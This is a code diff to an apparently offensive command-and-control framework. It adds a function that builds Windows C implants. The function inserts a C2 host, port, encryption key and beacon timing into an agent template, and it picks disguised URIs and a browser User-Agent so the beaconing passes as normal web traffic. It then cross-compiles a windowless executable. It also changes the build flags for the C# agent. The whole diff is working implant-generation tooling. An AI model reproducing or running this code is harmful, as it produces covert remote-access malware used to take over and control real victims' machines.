@@ -1570,10 +1570,10 @@ def {cmd_func}(cmd):
             f.write(src)
 
         out_name = f"agent_{self.random_string(8)}_windows.exe"
-        print(f"[*] Building C# agent for Windows x64...")
+        print(f"[*] Building C# agent for Windows x64 (framework-dependent)...")
         result = _sp.run(
             ['dotnet', 'publish', '-r', 'win-x64', '-c', 'Release',
-             '--self-contained', 'true', '-p:PublishSingleFile=true', '-p:PublishTrimmed=true'],
+             '--self-contained', 'false', '-p:PublishSingleFile=true'],
             cwd=str(cs_src.parent), capture_output=True, text=True, timeout=120
         )
 
@@ -1592,6 +1592,81 @@ def {cmd_func}(cmd):
 
         file_size = out_path.stat().st_size
         print(f"[+] C# agent compiled: {out_name} ({file_size/1024:.0f} KB)")
+        return str(out_path)
+
+    def generate_c_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
+                          transport: str = 'http', beacon_interval: int = 60, beacon_jitter: int = 0,
+                          unique_key: bool = True) -> str:
+        """Generate compiled C agent (Windows, MinGW cross-compiler)."""
+        import subprocess as _sp
+        import shutil
+        c_src = Path(__file__).parent / 'agent_c' / 'agent.c'
+        ghost_src = Path(__file__).parent / 'agent_c' / 'ghost_data.c'
+        if not c_src.exists():
+            return f"Error: C agent source not found at {c_src}"
+
+        mingw = shutil.which('x86_64-w64-mingw32-gcc')
+        if not mingw:
+            return "Error: MinGW not found — install x86_64-w64-mingw32-gcc"
+
+        if unique_key:
+            encryption_key = self.generate_unique_encryption_key()
+            if not hasattr(self, 'generated_keys'):
+                self.generated_keys = []
+            self.generated_keys.append(encryption_key)
+
+        uris = {'register': '/submit-form', 'checkin': '/api/v1/update', 'results': '/upload'}
+        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        if self._malleable_profiles:
+            profile_names = self._malleable_profiles['get_profile_names']()
+            profile_name = random.choice(profile_names)
+            uris = self._malleable_profiles['generate_uris'](profile_name)
+            headers = self._malleable_profiles['generate_http_headers'](profile_name)
+            ua = headers.get('User-Agent', ua)
+
+        scheme = transport if transport in ('http', 'https') else 'http'
+        use_https = '1' if scheme == 'https' else '0'
+
+        with open(c_src, 'r') as f:
+            src = f.read()
+
+        replacements = {
+            '{{C2_HOST}}': c2_host, '{{C2_PORT}}': str(c2_port),
+            '{{ENCRYPTION_KEY}}': encryption_key,
+            '{{BEACON_INTERVAL}}': str(beacon_interval), '{{BEACON_JITTER}}': str(beacon_jitter),
+            '{{REGISTER_URI}}': uris['register'], '{{CHECKIN_URI}}': uris['checkin'],
+            '{{RESULT_URI}}': uris['results'], '{{USE_HTTPS}}': use_https,
+        }
+        for k, v in replacements.items():
+            src = src.replace(k, v)
+
+        tmp_c = c_src.parent / 'agent_tmp.c'
+        with open(tmp_c, 'w') as f:
+            f.write(src)
+
+        out_name = f"agent_{self.random_string(8)}_windows.exe"
+        out_path = self.output_dir / out_name
+
+        src_files = [str(tmp_c)]
+        if ghost_src.exists():
+            src_files.append(str(ghost_src))
+
+        build_cmd = [mingw] + src_files + [
+            '-o', str(out_path),
+            '-lwinhttp', '-lbcrypt', '-Os', '-mwindows',
+        ]
+
+        print(f"[*] Cross-compiling C agent for Windows x64...")
+        result = _sp.run(build_cmd, capture_output=True, text=True, timeout=60)
+        os.remove(tmp_c)
+
+        if result.returncode != 0:
+            return f"Error: {result.stderr[:200]}"
+
+        file_size = out_path.stat().st_size
+        file_hash = hashlib.sha256(open(out_path, 'rb').read()).hexdigest()[:12]
+        print(f"[+] C agent compiled: {out_name} ({file_size/1024:.0f} KB)")
+        print(f"[+] SHA256: {file_hash}...")
         return str(out_path)
 
     def generate_stager(self, stage_url: str, encryption_key: str = None,
